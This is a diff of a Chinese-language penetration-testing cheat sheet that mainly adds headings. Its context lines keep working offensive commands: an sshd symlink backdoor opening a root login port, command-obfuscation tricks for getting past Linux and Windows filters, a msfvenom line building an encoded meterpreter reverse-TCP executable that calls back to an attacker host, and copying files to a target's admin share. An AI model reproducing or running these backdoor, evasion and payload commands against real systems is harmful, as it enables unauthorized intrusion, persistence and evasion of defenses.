@@ -4,7 +4,7 @@
 
 
 目录
------------------
+----------------------------------------------------
 
 * [Hacking study](#渗透相关语法)
 	* [信息收集](#信息收集)
@@ -50,7 +50,7 @@
 
 ### 域名相关
 
-***工具***
+****工具****
 ```
 subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
 Sublist3r
@@ -339,7 +339,7 @@ file_name(@@version)
 ```
 
 ## 命令及后门相关
-
+> **后门命令及常用渗透命令** 
 ### 开3389
 
 **DOS下开3389**
@@ -394,6 +394,8 @@ at \\127.0.0.25 10:50 "echo 5 > c:\t.txt" 在远程计算机上建立文本文�
 copy srv.exe \\hacden-pc\c$    #复制srv.exe到目标c盘上去 
 ```
 ### nmap命令
+
+**nmap扫描**
 ```
 查询在线主机
 nmap -sn 192.168.56.0/24
@@ -404,6 +406,8 @@ nmap -sS -sV -T5 -A -p- 192.168.0.109
 ```
 
 ### sshd软链接后门
+
+**sshd软链接后门**
 ```
 1、服务端执行
 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
@@ -430,6 +434,8 @@ UsePAM no
 ```
 
 ### lsof命令
+
+**lsof进程信息**
 ```
 列出某个用户打开文件的信息：
 lsof -u username
@@ -455,6 +461,8 @@ lsof -a -u username -i
 ```
 
 ### linux命令bypass
+
+**bypass-绕过**
 ```
 使用反斜杠
 w\ho\am\i
@@ -506,6 +514,8 @@ awk '{"date"| getline d; print d; close("d")}'
 ```
 
 ### cmd命令bypass
+
+**cmd命令混淆**
 ```
 逗号------------net user
 ,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;net user
@@ -536,13 +546,15 @@ CMd /C "sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl SeT fiNAl=%COm1%%cO
 ```
 
 ### msf命令
+
+**msf相关**
 ```
 生成exe文件
 msfveom -p windows/metepreter/reverse_tcp -a x86 --platform windows LHOST=192.168.43.63 LPORT=4444 -e x86/shikata_ga_nai -i 20 PrependMigrate=true -f exe >ma.exe
 ```
 
 ## shell反弹
-
+> **反弹shell基本语句** 
 ### php反弹shell
 
 ```
